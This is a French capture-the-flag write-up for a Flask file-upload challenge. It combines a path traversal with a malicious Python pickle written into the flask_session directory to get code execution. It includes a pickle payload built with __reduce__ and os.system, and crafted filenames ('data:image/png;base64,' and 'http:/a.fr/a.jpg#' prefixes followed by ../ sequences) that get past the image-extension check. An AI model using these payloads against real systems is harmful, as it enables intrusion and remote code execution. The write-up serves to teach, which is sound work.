Futur Upload 
===========================

Enoncé
----------

Cloud storage is back in 2077, better UI and folders management !

Résolution
-------------

Avec le code source, on peut voir qu'il y a une path traversal dans l'upload de fichier.

Cependant accès uniquement a /app/user_files/ et /app/flask_session/

Toutes les autres méthodes semblent correctement protégé

Si on arrive a upload un fichier sérialisé avec python pickle dans /app/flask_session/MD5HASH, on peut obtenir la RCE.

Problème 1 : Nous n'avons pas la SESSION_KEY_PREFIX qui permet de créer le hash MD5HASH
Problème 2 : Nous sommes obligé d'upload le fichier avec .png ou .jpg

On a bien vérifier que si on upload un fichier avec le hash, les données sérialisé alors il s'execute si on envoie le bon jeton de session, mais nous sommes bloqués par le deux problèmes

.. code-block:: python

    import pickle
    import base64
    import os

    # Objet malveillant qui appelle os.system pour exécuter une commande
    class RCE:
        def __reduce__(self):
            return (os.system, ('echo "test" > /app/user_files/df214423-da5a-41d8-b862-507f95d7dce8/test.txt',))

    # Création d'un payload pickle malveillant
    payload = pickle.dumps({'_permanent': False, 'user_id': 'admin', 'data': RCE()})

    # Ajout des 4 premiers bytes à 0 pour signaler que c'est un pickle
    payload_with_magic_header = b'\x00\x00\x00\x00' + payload

    # Encodage en base64 pour l'injecter dans un cookie ou dans un fichier de session
    encoded_payload = base64.b64encode(payload_with_magic_header)

    # Affichage du payload encodé en base64
    print("Payload encodé en base64 avec 4 bytes 0 :")
    print(encoded_payload.decode('utf-8'))


On n'a pas réussi a allez plus loin.

On a demandé à la fin du CTF : 

Créer un directory "data:image," dedans, créer un autre directory "png;base64,""

ensuite upload un objet pickle nommé 

.. code-block:: console
    
    test/../../../../../../app/flask_session/2029240f6d1128be89ddc32729463129

Ce qui donne un upload vers : 

.. code-block:: console
    
    data:image/png;base64,test/../../../../../../app/flask_session/2029240f6d1128be89ddc32729463129

Pour path traversal et aller écrire le fichier 2029240f6d1128be89ddc32729463129 qui change jamais de nom pour les app flask_session et est désérialisé a chaque requête

OU : 

Créer les dossiers http:, a.fr, a.jpg# et ensuite tu peux upload ce que tu veux où tu veux car mimetype va utiliser filename=  "http:/a.fr/a.jpg#/../../chemin/fichier"  car le check comprend et accepte les urls

Il nous manquer le data:image et png;base64 qui permettait de bypass le .png
Ou le http://a.fr/a.jpg#/../../../

Et ensuite on utilise le 2029240f6d1128be89ddc32729463129 qui est déjà présent plutôt que de tenter de recalculer le hash a cause de la clé session_key_prefix
